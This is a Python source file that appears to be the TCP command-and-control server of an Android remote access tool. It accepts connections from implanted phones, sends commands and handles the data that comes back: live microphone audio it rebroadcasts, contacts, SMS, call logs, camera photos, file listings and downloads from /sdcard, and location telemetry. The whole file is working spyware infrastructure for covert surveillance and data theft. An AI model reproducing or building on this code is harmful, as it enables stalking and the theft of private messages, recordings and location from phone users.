import asyncio
import json
import socket
from typing import Any, Dict

from app.audio.broadcaster import broadcast_audio
from app.config import settings
from app.logger import log_error, log_info, log_warn
from app.protocol import recv_frame
from app.state import state, ClientSession
from app.tcp.commands import send_command
from app.tcp.dispatcher import fail_all_pending, resolve_pending
from app.tcp.handlers import (
    process_call_logs_data,
    process_cams_data,
    process_files_data,
    process_sms_data,
    process_telemetry_data,
    save_contacts_data,
    save_downloaded_file_data,
    save_photo_data,
)


async def reader_loop(client: ClientSession) -> None:
    try:
        while client.is_connected() and state.listening:
            try:
                frame = await recv_frame(client.reader)
            except (
                asyncio.IncompleteReadError,
                ConnectionResetError,
                BrokenPipeError,
                asyncio.CancelledError,
            ):
                break
            except Exception as e:
                log_warn(f"tcp connection closed for {client.id}: {e}")
                break

            try:
                header = json.loads(frame.decode("utf-8"))
            except Exception as e:
                log_warn(f"invalid json frame from {client.id}: {e}")
                continue

            msg_type = header.get("type")

            if msg_type == "mic_chunk":
                try:
                    audio_data = await recv_frame(client.reader)
                    client.mic_active = True
                    if state.active_client_id == client.id:
                        await broadcast_audio(audio_data)
                except Exception as e:
                    log_warn(f"mic frame read interrupted for {client.id}: {e}")
                    break

            elif msg_type == "contacts":
                try:
                    data = await recv_frame(client.reader)
                    path = save_contacts_data(client, data)
                    resolve_pending(
                        "contacts",
                        {"status": "ok" if path else "failed", "path": path},
                        client_id=client.id,
                    )
                except Exception as e:
                    log_error(f"contacts read failed for {client.id}: {e}")
                    resolve_pending("contacts", {"status": "failed", "path": None}, client_id=client.id)

            elif msg_type == "camera_capture":
                try:
                    data = await recv_frame(client.reader)
                    if settings.enable_camera:
                        cam_id = header.get("cam_id", "0")
                        path = save_photo_data(client, str(cam_id), data)
                        resolve_pending(
                            "camera_capture",
                            {"status": "ok" if path else "failed", "path": path},
                            client_id=client.id,
                        )
                    else:
                        resolve_pending(
                            "camera_capture",
                            {"status": "disabled", "message": "Camera feature is disabled", "path": None},
                            client_id=client.id,
                        )
                except Exception as e:
                    log_error(f"camera capture read failed for {client.id}: {e}")
                    resolve_pending("camera_capture", {"status": "failed", "path": None}, client_id=client.id)

            elif msg_type == "sms":
                messages = header.get("data", [])
                hours = header.get("hours", 24)
                res = process_sms_data(client, messages, hours)
                resolve_pending("sms", {"status": "ok", "data": res}, client_id=client.id)

            elif msg_type == "call_logs":
                calls = header.get("data", [])
                hours = header.get("hours", 24)
                res = process_call_logs_data(client, calls, hours)
                resolve_pending("call_logs", {"status": "ok", "data": res}, client_id=client.id)

            elif msg_type == "cams":
                if settings.enable_camera:
                    cams = header.get("data", [])
                    res = process_cams_data(client, cams)
                    resolve_pending("cams", {"status": "ok", "data": res}, client_id=client.id)
                else:
                    resolve_pending(
                        "cams",
                        {"status": "disabled", "message": "Camera feature is disabled", "data": []},
                        client_id=client.id,
                    )

            elif msg_type == "telemetry":
                res = process_telemetry_data(client, header)
                resolve_pending("telemetry", {"status": "ok", "data": res}, client_id=client.id)

            elif msg_type == "files":
                files = header.get("data", [])
                current_path = header.get("path", "/sdcard")
                res = process_files_data(client, files, current_path)
                resolve_pending("files", {"status": "ok", "path": current_path, "data": res}, client_id=client.id)

            elif msg_type == "file_download":
                try:
                    data = await recv_frame(client.reader)
                    file_info = save_downloaded_file_data(client, header, data)
                    resolve_pending("file_download", {"status": "ok", **file_info}, client_id=client.id)
                except Exception as e:
                    log_error(f"file download read failed for {client.id}: {e}")
                    resolve_pending("file_download", {"status": "failed", "data": None}, client_id=client.id)

            elif msg_type == "error":
                msg = header.get("message", "unknown error")
                log_warn(f"client {client.id} reported: {msg}")
                cmd = header.get("cmd")
                msg_lower = msg.lower()
                if "mic" in msg_lower or "audio" in msg_lower or cmd == "mic":
                    client.mic_active = False

                target_key = cmd
                if not target_key:
                    if "contact" in msg_lower:
                        target_key = "contacts"
                    elif "sms" in msg_lower:
                        target_key = "sms"
                    elif "call" in msg_lower:
                        target_key = "call_logs"
                    elif "telemetry" in msg_lower or "location" in msg_lower:
                        target_key = "telemetry"
                    elif "download" in msg_lower:
                        target_key = "file_download"
                    elif "file" in msg_lower or "directory" in msg_lower:
                        target_key = "files"
                    elif "cam" in msg_lower or "photo" in msg_lower or "picture" in msg_lower:
                        target_key = "camera_capture"
                        resolve_pending("cams", {"status": "error", "message": msg, "data": []}, client_id=client.id)

                if target_key:
                    resolve_pending(
                        target_key,
                        {"status": "error", "message": msg, "data": None, "path": None},
                        client_id=client.id,
                    )
    finally:
        fail_all_pending(ConnectionResetError("client disconnected"), client_id=client.id)
        writer = client.writer
        state.remove_client(client.id)
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        log_info(f"client {client.id} disconnected")


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    addr = writer.get_extra_info("peername")
    client_id = f"{addr[0]}_{addr[1]}"
    client = ClientSession(client_id, reader, writer, addr)
    state.add_client(client)
    log_info(f"client connected: {client_id} ({addr[0]}:{addr[1]})")
    try:
        await send_command({"cmd": "connected"}, client_id=client.id)
        await send_command({"cmd": "get_telemetry"}, client_id=client.id)
    except Exception as e:
        log_warn(f"handshake error for {client.id}: {e}")
    await reader_loop(client)


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    sock = writer.get_extra_info("socket")
    if sock:
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except Exception:
            pass
    await client_session(reader, writer)


async def start_tcp_server_action() -> Dict[str, Any]:
    if state.listening:
        return {"status": "already_listening"}
    try:
        server = await asyncio.start_server(tcp_client_handler, settings.tcp_host, settings.tcp_port)
        state.tcp_server = server
        state.listening = True
        log_info(f"TCP server listening on {settings.tcp_host}:{settings.tcp_port}")
        return {"status": "started", "host": settings.tcp_host, "port": settings.tcp_port}
    except OSError as e:
        log_error(f"failed to bind TCP port {settings.tcp_port}: {e}")
        return {"status": "error", "message": str(e)}
    except Exception as e:
        log_error(f"failed to start TCP server: {e}")
        return {"status": "error", "message": str(e)}


async def stop_tcp_server_action() -> Dict[str, str]:
    if not state.listening:
        return {"status": "not_listening"}
    server = state.tcp_server
    if server:
        server.close()
        await server.wait_closed()
        state.tcp_server = None
        state.listening = False
    client_ids = list(state.clients.keys())
    for cid in client_ids:
        client = state.clients.get(cid)
        if client and client.writer:
            try:
                client.writer.close()
                await client.writer.wait_closed()
            except Exception:
                pass
        state.remove_client(cid)
    log_info("TCP server stopped")
    return {"status": "stopped"}
